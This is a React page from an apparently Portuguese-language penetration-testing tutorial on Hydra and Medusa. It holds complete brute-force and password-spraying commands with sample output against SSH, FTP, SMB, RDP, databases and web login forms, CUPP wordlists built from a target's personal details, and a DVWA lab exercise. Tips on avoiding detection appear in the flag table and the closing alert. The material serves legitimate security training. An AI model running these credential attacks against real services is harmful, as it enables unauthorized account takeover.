import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Hydra() {
  return (
    <PageContainer
      title="Hydra — Brute force online"
      subtitle="Brute força contra serviços de rede vivos: SSH, FTP, RDP, SMB, HTTP forms, Telnet, MySQL."
      difficulty="iniciante"
      timeToRead="14 min"
    >
      <h2>Quando usar</h2>
      <p>
        <strong>Online brute force</strong> = você está atacando o serviço VIVO em rede.
        Lento, gera ruído nos logs, dispara rate-limit. Use para:
      </p>
      <ul>
        <li>Confirmar uma credencial conhecida.</li>
        <li>Spraying de 1 senha em várias contas (pouco ruído).</li>
        <li>Brute em CTF / lab onde rate-limit não existe.</li>
      </ul>
      <p>
        Para crackear hashes que você já tem: use <a href="#/john">John</a> ou{" "}
        <a href="#/hashcat">Hashcat</a> (offline = milhares de vezes mais rápido).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "hydra -h | head -10",
            out: `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE]
              [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT]
              [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]`,
            outType: "info",
          },
          {
            cmd: "hydra -h | grep '^Supported'",
            out: `Supported services: adam6500 asterisk afp cisco cisco-enable cobaltstrike cvs ftp[s] http[s]-{head|get|post}
http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s]
memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres
radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey
svn teamspeak telnet[s] vmauthd vnc xmpp`,
            outType: "default",
          },
        ]}
      />

      <h2>SSH brute force</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 4 -V",
            out: `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://192.168.1.50:22/

[ATTEMPT] target 192.168.1.50 - login "admin" - pass "123456" - 1 of 14344398 [child 0]
[ATTEMPT] target 192.168.1.50 - login "admin" - pass "12345" - 2 of 14344398 [child 1]
[ATTEMPT] target 192.168.1.50 - login "admin" - pass "123456789" - 3 of 14344398 [child 2]
[ATTEMPT] target 192.168.1.50 - login "admin" - pass "password" - 4 of 14344398 [child 3]
[ATTEMPT] target 192.168.1.50 - login "admin" - pass "iloveyou" - 5 of 14344398 [child 0]
[ATTEMPT] target 192.168.1.50 - login "admin" - pass "rockyou" - 6 of 14344398 [child 1]
[22][ssh] host: 192.168.1.50   login: admin   password: P@ssw0rd!
[STATUS] attack finished for 192.168.1.50 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found`,
            outType: "success",
          },
        ]}
      />

      <CommandTable
        title="Flags principais"
        variations={[
          { cmd: "-l admin", desc: "Login único.", output: "Para spraying." },
          { cmd: "-L users.txt", desc: "Lista de usuários.", output: "Brute força com várias contas." },
          { cmd: "-p Senha123", desc: "Senha única.", output: "Para password spraying." },
          { cmd: "-P passwords.txt", desc: "Lista de senhas.", output: "rockyou, top10k, custom." },
          { cmd: "-C combos.txt", desc: "Arquivo no formato user:pass por linha.", output: "Use leaks da empresa." },
          { cmd: "-t 4", desc: "Threads (DEFAULT 16, mas SSH limita).", output: "SSH = max 4 (senão MaxAuthTries trava)." },
          { cmd: "-V", desc: "Verbose: mostra cada tentativa.", output: "Útil para depurar. Tire em produção." },
          { cmd: "-f", desc: "Para no PRIMEIRO sucesso.", output: "Default tenta achar várias creds." },
          { cmd: "-F", desc: "Para no primeiro sucesso GLOBAL (multi-host).", output: "Para -M (lista de hosts)." },
          { cmd: "-e nsr", desc: "Extras: n=null, s=login, r=reverse.", output: "Sempre testar admin:admin, user:user, etc." },
          { cmd: "-o success.txt", desc: "Salva sucessos em arquivo.", output: "Sem cores." },
          { cmd: "-s 2222", desc: "Porta diferente.", output: "Para SSH em porta custom." },
          { cmd: "-w 30", desc: "Timeout em segundos.", output: "Aumentar em alvos lentos." },
          { cmd: "-M hosts.txt", desc: "Lista de alvos.", output: "Cluster bomb em N hosts." },
        ]}
      />

      <h2>Outros serviços</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "FTP",
            cmd: "hydra -L users.txt -P pass.txt 192.168.1.50 ftp -t 16 -f",
            out: "[21][ftp] host: 192.168.1.50   login: ftpuser   password: ftpuser123",
            outType: "success",
          },
          {
            comment: "SMB",
            cmd: "hydra -L users.txt -P pass.txt 192.168.1.50 smb -t 1",
            out: "[445][smb] host: 192.168.1.50   login: admin   password: P@ssw0rd!",
            outType: "warning",
          },
          {
            comment: "RDP (Windows)",
            cmd: "hydra -l administrator -P pass.txt rdp://192.168.1.50",
            out: `[3389][rdp] host: 192.168.1.50   login: administrator   password: Password123!`,
            outType: "warning",
          },
          {
            comment: "MySQL",
            cmd: "hydra -l root -P pass.txt mysql://192.168.1.50",
            out: "[3306][mysql] host: 192.168.1.50   login: root   password: root",
            outType: "error",
          },
          {
            comment: "PostgreSQL",
            cmd: "hydra -L users.txt -P pass.txt postgres://192.168.1.50",
            out: "[5432][postgres] host: 192.168.1.50   login: postgres   password: postgres",
            outType: "error",
          },
        ]}
      />

      <h2>HTTP form (login web)</h2>
      <p>
        O mais útil — mas também o mais difícil de configurar.
        Sintaxe: <code>http[s]-post-form "/path:body:fail_string"</code>
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "1) primeiro veja o form com curl/Burp",
            cmd: "curl -s https://app.local/login | grep -E 'name=|action='",
            out: `<form action="/login" method="POST">
  <input name="username" />
  <input name="password" type="password" />`,
            outType: "info",
          },
          {
            comment: "2) faça 1 tentativa com creds conhecidamente erradas e veja a resposta",
            cmd: "curl -s -X POST https://app.local/login -d 'username=teste&password=erradinha' | grep -i 'invalid\\|error\\|fail'",
            out: `<div class="error">Invalid credentials</div>`,
            outType: "default",
          },
          {
            comment: "3) monte o ataque hydra: ^USER^ e ^PASS^ marcam onde varia",
            cmd: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt app.local \\
  https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" \\
  -t 16 -f -V`,
            out: `[ATTEMPT] target app.local - login "admin" - pass "123456"
[ATTEMPT] target app.local - login "admin" - pass "password"
[443][http-post-form] host: app.local   login: admin   password: P@ssw0rd2024
[STATUS] attack finished for app.local (valid pair found)`,
            outType: "success",
          },
        ]}
      />

      <h3>Quando usar S= em vez de fail string</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "se a página de erro NÃO TEM string única, marque o que aparece no SUCESSO com S=",
            cmd: `hydra -l admin -P pass.txt app.local \\
  https-post-form "/login:user=^USER^&pass=^PASS^:S=Bem-vindo"`,
            out: "(considera sucesso quando 'Bem-vindo' aparecer na response)",
            outType: "muted",
          },
          {
            comment: "com cookie de sessão (CSRF token, anti-bot)",
            cmd: `hydra -l admin -P pass.txt app.local \\
  https-post-form "/login:user=^USER^&pass=^PASS^&csrf=ABC123:F=Invalid:H=Cookie\\: session=xyz"`,
            out: "(F= é fail string, H= adiciona header)",
            outType: "default",
          },
        ]}
      />

      <h2>Password spraying (1 senha em N usuários)</h2>
      <p>Spraying é o oposto do brute force — uma senha conhecida testada em vários usuários, longe do rate-limit por conta.</p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "hydra -L users.txt -p 'Welcome2026!' 192.168.1.50 smb -t 1",
            out: `[ATTEMPT] target 192.168.1.50 - login "admin" - pass "Welcome2026!"
[ATTEMPT] target 192.168.1.50 - login "ana" - pass "Welcome2026!"
[ATTEMPT] target 192.168.1.50 - login "joao" - pass "Welcome2026!"
[ATTEMPT] target 192.168.1.50 - login "maria" - pass "Welcome2026!"
[445][smb] host: 192.168.1.50   login: maria   password: Welcome2026!
[STATUS] attack finished for 192.168.1.50 (valid pair found)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Combos e mutações</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "gerar mutações da senha base com cupp",
            cmd: "cupp -i",
            out: `[+] First Name: Wallyson
[+] Surname: Lopes
[+] Nickname: wd
[+] Birthdate (DDMMYYYY): 14021990
[+] Pet's name: Luna
[+] Company name: ACME
[+] Want to add some words about the victim? (y/n): n
[+] Add special chars at the end of words? (y/n): y
[+] Add some random numbers at the end of words? (y/n): y
[+] Leet mode? (y/n): y

[+] Now making a dictionary...
[+] Saving dictionary to wallyson.txt, counting 14672 words.`,
            outType: "info",
          },
          {
            cmd: "head -10 wallyson.txt",
            out: `wallyson
Wallyson
WALLYSON
wallyson1990
Wallyson1990
wallyson@1990
Wallyson@1990
w@lly$0n
W@lly$0n
luna1990`,
            outType: "default",
          },
          {
            cmd: "hydra -l wallyson -P wallyson.txt app.local https-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
            out: "[443][http-post-form] host: app.local   login: wallyson   password: W@lly$0n@1990",
            outType: "warning",
          },
        ]}
      />

      <h2>medusa — alternativa ao hydra</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "medusa -h 192.168.1.50 -U users.txt -P pass.txt -M ssh -t 4 -f",
            out: `Medusa v2.2 [http://www.foofus.net]

ACCOUNT CHECK: [ssh] Host: 192.168.1.50 (1 of 1, 0 complete) User: admin (1 of 5, 0 complete) Password: 123456 (1 of 100, 0 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.50 User: admin Password: P@ssw0rd! [SUCCESS]`,
            outType: "success",
          },
        ]}
      />

      <PracticeBox
        title="Spraying contra DVWA"
        goal="Praticar spray + brute em form HTTP em laboratório."
        steps={[
          "Suba DVWA local em docker.",
          "Crie users.txt com nomes (admin, gordon, smithy).",
          "Spray a senha 'password' em todos via hydra.",
          "Depois: brute force admin × top10 senhas.",
        ]}
        command={`docker run -d -p 8080:80 vulnerables/web-dvwa
sleep 5
firefox http://localhost:8080 &  # setup → create db → login admin/password

cat > users.txt << 'EOF'
admin
gordonb
1337
pablo
smithy
EOF

# spray
hydra -L users.txt -p password localhost \\
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \\
  -t 4 -V`}
        expected={`[80][http-post-form] host: localhost   login: admin    password: password
[80][http-post-form] host: localhost   login: gordonb  password: password    ← se houver
[STATUS] attack finished for localhost (valid pair found)`}
        verify="O hydra deve achar pelo menos 1 valid pair. No DVWA padrão admin/password é o default."
      />

      <AlertBox type="danger" title="Brute online é detectável">
        Cada tentativa errada acende um log no alvo. Em produção sem autorização, gera
        evidência criminal e bloqueia sua conta. Use só em alvo seu, lab/CTF/THM/HTB,
        ou com contrato de pentest assinado. <strong>Sempre prefira spraying</strong>{" "}
        (1 senha × N users) em vez de brute (N senhas × 1 user) — menos detecção.
      </AlertBox>
    </PageContainer>
  );
}
